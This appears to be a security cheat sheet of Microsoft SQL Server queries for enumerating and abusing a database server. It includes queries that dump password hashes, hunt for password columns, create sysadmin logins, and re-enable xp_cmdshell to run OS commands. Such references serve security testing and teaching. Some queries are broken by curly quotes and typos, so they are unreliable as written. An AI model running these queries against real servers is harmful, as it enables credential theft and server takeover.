# Queries Cheat Sheet

Some of the queries in the table below can only be run by an admin. These are marked with "_-- \[priv\]"_ at the end of the query.

<table>
  <thead>
    <tr>
      <th style="text-align:left">Usage</th>
      <th style="text-align:left">Query</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Version</td>
      <td style="text-align:left"><code>SELECT @@version</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Comments</td>
      <td style="text-align:left">
        <p><code>SELECT 1 -- comment</code>
        </p>
        <p><code>SELECT /*comment*/1</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current User</td>
      <td style="text-align:left">
        <p><code>SELECT user_name();</code>
        </p>
        <p><code>SELECT system_user;</code>
        </p>
        <p><code>SELECT user;</code>
        </p>
        <p><code>SELECT loginame FROM master..sysprocesses WHERE spid == @@SPID</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Users</td>
      <td style="text-align:left"><code>SELECT name FROM master..syslogins</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Password Hashes</td>
      <td style="text-align:left"><code>SELECT name, password FROM master..sysxlogins</code><em><code> -- [priv] # mssql 2000;</code></em><code>SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins </code><em><code>-- [priv] # mssql 2000. Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.</code></em><code>SELECT name, password_hash FROM master.sys.sql_logins </code><em><code>-- [priv] # mssql 2005</code></em><code>SELECT name + &#x2018;-&#x2019; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins </code><em><code>-- [priv] # mssql 2005</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Privileges</td>
      <td style="text-align:left">
        <p><code># current privs on a particular object in 2005, 2008<br />SELECT permission_name FROM master..fn_my_permissions(null, &#x2018;DATABASE&#x2019;); &#x2014; current database<br />SELECT permission_name FROM master..fn_my_permissions(null, &#x2018;SERVER&#x2019;); &#x2014; current server<br />SELECT permission_name FROM master..fn_my_permissions(&#x2018;master..syslogins&#x2019;, &#x2018;OBJECT&#x2019;); &#x2013;permissions on a table<br />SELECT permission_name FROM master..fn_my_permissions(&#x2018;sa&#x2019;, &#x2018;USER&#x2019;);</code>
        </p>
        <p><code># permissions on a user-current privs in 2005, 2008<br />SELECT is_srvrolemember(&#x2018;sysadmin&#x2019;);<br />SELECT is_srvrolemember(&#x2018;dbcreator&#x2019;);<br />SELECT is_srvrolemember(&#x2018;bulkadmin&#x2019;);<br />SELECT is_srvrolemember(&#x2018;diskadmin&#x2019;);<br />SELECT is_srvrolemember(&#x2018;processadmin&#x2019;);<br />SELECT is_srvrolemember(&#x2018;serveradmin&#x2019;);<br />SELECT is_srvrolemember(&#x2018;setupadmin&#x2019;);<br />SELECT is_srvrolemember(&#x2018;securityadmin&#x2019;);</code>
        </p>
        <p><code># who has a particular priv? 2005, 2008<br />SELECT name FROM master..syslogins WHERE denylogin = 0;<br />SELECT name FROM master..syslogins WHERE hasaccess = 1;<br />SELECT name FROM master..syslogins WHERE isntname = 0;<br />SELECT name FROM master..syslogins WHERE isntgroup = 0;<br />SELECT name FROM master..syslogins WHERE sysadmin = 1;<br />SELECT name FROM master..syslogins WHERE securityadmin = 1;<br />SELECT name FROM master..syslogins WHERE serveradmin = 1;<br />SELECT name FROM master..syslogins WHERE setupadmin = 1;<br />SELECT name FROM master..syslogins WHERE processadmin = 1;<br />SELECT name FROM master..syslogins WHERE diskadmin = 1;<br />SELECT name FROM master..syslogins WHERE dbcreator = 1;<br />SELECT name FROM master..syslogins WHERE bulkadmin = 1;</code>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List DBA Accounts</td>
      <td style="text-align:left"><code>SELECT is_srvrolemember(&#x2018;sysadmin&#x2019;); </code><em><code># is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try &#x2018;bulkadmin&#x2019;, &#x2018;systemadmin&#x2019;.</code></em><code>SELECT is_srvrolemember(&#x2018;sysadmin&#x2019;, &#x2018;sa&#x2019;); </code><em><code># is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.</code></em><code>SELECT name FROM master..syslogins WHERE sysadmin = &#x2019;1&#x2032;</code><em><code># tested on 2005</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Current Database</td>
      <td style="text-align:left"><code>SELECT DB_NAME()</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Databases</td>
      <td style="text-align:left"><code>SELECT name FROM master..sysdatabases;<br />SELECT DB_NAME(N);</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Tables</td>
      <td style="text-align:left"><code>SELECT name FROM master..sysobjects WHERE xtype = &#x2018;U&#x2019;; </code><em><code># use xtype = &#x2018;V&#x2019; for views</code></em><code>SELECT name FROM someotherdb..sysobjects WHERE xtype = &#x2018;U&#x2019;;<br />SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#x2019;sometable&#x2019;; </code><em><code># list colum names and types for master..sometable</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">List Columns</td>
      <td style="text-align:left"><code>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#x2018;mytable&#x2019;); </code><em><code># for the current DB only</code></em><code>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#x2019;sometable&#x2019;; </code><em><code># list colum names and types for master..sometable</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Find Tables from Column Name</td>
      <td style="text-align:left"><code>SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = &#x2018;U&#x2019; AND syscolumns.name LIKE &#x2018;%PASSWORD%&#x2019; </code><em><code># this lists table, column for each column containing the word &#x2018;password&#x2019;</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Hostname, IP Address</td>
      <td style="text-align:left"><code>SELECT HOST_NAME()</code>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Create Users</td>
      <td style="text-align:left"><code>EXEC </code><a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx"><code>sp_addlogin</code></a><code> &#x2018;user&#x2019;, &#x2018;pass&#x2019;;</code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Delete Users</td>
      <td style="text-align:left"><code>EXEC </code><a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx"><code>sp_droplogin</code></a><code> &#x2018;user&#x2019;;</code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Make User DBA</td>
      <td style="text-align:left"><code>EXEC </code><a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx"><code>master.dbo.sp_addsrvrolemember</code></a><code> &#x2018;user&#x2019;, &#x2018;sysadmin; </code><em><code>-- [priv]</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Location of DB Files</td>
      <td style="text-align:left"><code>EXEC sp_helpdb master; </code><em><code># location of master.mdf</code></em>
        <br
        /><code>EXEC sp_helpdb pubs; </code><em><code># location of pubs.mdf</code></em>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Command Execution</td>
      <td style="text-align:left"><code>EXEC xp_cmdshell &#x2018;net user&#x2019;;</code><em><code> -- [priv]</code></em><code> # On MSSQL 2005 you may need to reactivate xp_cmdshell first as it&#x2019;s disabled by default:</code>
        <br
        /><code>EXEC sp_configure &#x2018;show advanced options&#x2019;, 1;</code><em><code> -- [priv]</code><br /></em><code>RECONFIGURE; </code><em><code>-- [priv]</code><br /></em><code>EXEC sp_configure &#x2018;xp_cmdshell&#x2019;, 1; </code><em><code>-- [priv]</code><br /></em><code>RECONFIGURE; </code><em><code>-- [priv]</code></em>
      </td>
    </tr>
  </tbody>
</table>

